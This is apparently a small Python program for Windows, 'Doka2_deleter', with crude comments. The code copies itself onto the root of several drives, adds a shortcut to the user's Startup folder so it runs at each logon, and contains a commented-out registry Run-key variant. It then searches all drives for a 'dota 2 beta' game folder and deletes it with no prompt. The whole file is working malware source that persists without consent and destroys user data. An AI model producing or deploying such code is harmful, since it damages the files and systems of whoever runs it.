import winreg as reg
import os
import shutil
import winshell
import win32com.client

path = ['C:/', 'D:/', 'E:/', 'F:/', 'G:/', 'H:/', 'I:/', 'J:/', 'K:/']
to_find = "dota 2 beta"

# type_find = input("1 - dota 2 beta\n2 - Counter-Strike Global Offensive\n3 - TestDir\nEnter type [1-3] to find:")
# if (type_find == "1"):
#     to_find = "dota 2 beta"
# elif (type_find == "2"):
#     to_find = "Counter-Strike Global Offensive"
# elif (type_find == "3"):
#     to_find = "TestDir"
# else:
#     print("You entered shit, im closing")
#     input()
#     exit()

" Lets find 'to_find' folder"
def lets_go():
    res = []
    for where_find in path:
        print("Start find in label " + where_find)
        found = False
        for dirs, folder, files in os.walk(where_find):
            if found == True:
                break
            for fol in folder:
                if (fol == to_find):
                    found = True
                    print("Found ", dirs, "*pow*pow*pow*")
                    res.append(dirs)
                    break
        if found == True:
            break
    return res

" Deletes 'to_find' folder in 'path' path, geniously"
def delet_dis(path):
    print("Preparing to delele from folder", path)
    to_del = os.path.join(os.path.abspath(path), to_find)
    print("to_del =", str(to_del))
    shutil.rmtree(to_del)

" Adds this programm to autostart"
def addToRegistry():
    print("copying file")
    for entry in path:
        if not os.path.exists(str(entry) + "\Doka2_deleter.exe"):
            try:
                shutil.copy2('.\Doka2_deleter.exe', str(entry) + "\Doka2_deleter.exe")
                startup = winshell.startup()
                print(startup)
                ws = win32com.client.Dispatch("wscript.shell")
                scut = ws.CreateShortcut(startup + '\Doka2_deleter.lnk')
                scut.TargetPath = '"' + str(entry) + "\Doka2_deleter.exe" + '"'
                scut.Arguments = ''
                scut.Save()
                # pth = os.path.dirname(entry.replace("/", "\\"))
                # s_name = "main.exe"
                # address = os.path.join(pth, s_name)
                # print("address =", str(address))
                # tmp = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_ALL_ACCESS)
                # reg.SetValue(tmp, None, reg.REG_SZ, address)
                # reg.CloseKey(tmp)
                print("Added to registry")
                break
            except Exception as e:
                pass
        else:
            print("file exists")
            break
        
addToRegistry()
print ("Test 1 success : RESPECT +++++++++++++")

res = lets_go()

print("Results:")
i = 1
for entry in res:
    print(str(i) + " " + entry)
    i = i + 1
if (len(res) > 0):
    print ("Test 2 success : RESPECT +++++++++++++")
    for entry in res:
        delet_dis(entry)
    print ("Test 3 success : RESPECT +++++++++++++")
        